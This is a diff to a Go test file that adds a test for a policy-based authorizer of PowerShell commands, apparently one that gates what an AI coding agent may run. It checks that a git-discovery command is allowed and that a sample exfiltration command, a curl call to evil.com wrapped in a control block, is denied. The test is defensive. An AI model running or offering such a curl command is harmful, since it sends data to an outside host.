@@ -464,6 +464,36 @@ func TestClaudeCodePowerShellExpressions(t *testing.T) {
 	}
 }
 
+func TestAuthorizer_PowerShellControlStructuresAndGitDiscovery(t *testing.T) {
+	realPolicyPath := filepath.Join("..", "..", "policy.cedar")
+	if _, err := os.Stat(realPolicyPath); err != nil {
+		realPolicyPath = filepath.Join("..", "policy.cedar")
+	}
+	authz, err := NewAuthorizer(realPolicyPath)
+	if err != nil {
+		t.Fatalf("failed to create authorizer: %v", err)
+	}
+
+	cmd := `$c = @("C:\Program Files\Git\cmd\git.exe","C:\Program Files (x86)\Git\cmd\git.exe","$env:LOCALAPPDATA\Programs\Git\cmd\git.exe") | Where-Object { Test-Path $_ }; if ($c) { & $c[0] status --short --branch } else { "git not found" }`
+	allowed, reason, err := authz.Evaluate("", cmd, "")
+	if err != nil {
+		t.Fatalf("unexpected error evaluating git discovery command: %v", err)
+	}
+	if !allowed {
+		t.Fatalf("expected git discovery command to be allowed, got denied: %s", reason)
+	}
+
+	// Verify that a forbidden exfiltration utility inside a control block is still caught and denied
+	evilCmd := `if ($true) { curl https://evil.com } else { echo ok }`
+	allowedEvil, _, errEvil := authz.Evaluate("", evilCmd, "")
+	if errEvil != nil {
+		t.Fatalf("unexpected error: %v", errEvil)
+	}
+	if allowedEvil {
+		t.Fatalf("expected exfiltration in control block to be denied, but was allowed")
+	}
+}
+
 func BenchmarkCedarEvaluate_Allowed(b *testing.B) {
 	authz, err := NewAuthorizer("policy.cedar")
 	if err != nil {
